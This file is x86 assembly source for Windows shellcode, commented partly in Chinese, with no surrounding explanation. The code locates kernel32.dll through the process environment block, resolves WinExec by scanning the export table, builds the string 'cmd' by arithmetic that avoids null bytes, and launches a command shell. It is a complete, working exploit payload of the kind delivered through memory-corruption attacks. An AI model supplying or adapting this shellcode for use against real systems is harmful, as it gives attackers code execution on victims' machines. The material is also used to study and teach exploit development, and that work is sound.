		.386
		.model flat,stdcall
		option casemap:none

		.code
	
start:

		assume fs:nothing
		pushad
		
		cld
		sub esp,40h
		xor ecx,ecx
		mov eax,fs:[ecx+30h]	;peb 
		mov eax,[eax + 0ch] 	;ldr
		mov esi,[eax + 1ch]	;module list
next_module:
		mov   eax,[esi+08h]   
		mov   edi,[esi+20h]   
		mov   esi,[esi]
		cmp  [edi+12*2],cx     
		jnz  next_module       
		mov  ebp,eax   ;ebp :kernel32.dll MZ头部

find_function:
		mov eax,[ebp+3ch]	;pe头部
		mov ecx,[ebp+eax+78h]
		add ecx,ebp		;导出表
		mov ebx,[ecx+20h]
		add ebx,ebp		;导出函数名称表
		xor edi,edi
		dec edi
nexta:
		inc edi
		mov esi,[ebx+edi*4]
	
		add esi,ebp
		mov eax,[esi]    ;cmp
		cmp eax,456E6957h	
		jnz  nexta
		mov ebx,[ecx+24h]
		add ebx,ebp
		mov di,[ebx+2*edi]
		mov ebx,[ecx+1ch]
		add ebx,ebp
		add ebp,[ebx+4*edi]
		xchg eax,ebp
		xor ebx,ebx
		inc ebx
		mov ecx,01747D73h
		sub ecx,01101010h
		push ecx
		push ebx
		lea ebx,[esp+4]
		push ebx
		call eax
		add esp,44h
		popad
		ret
		end start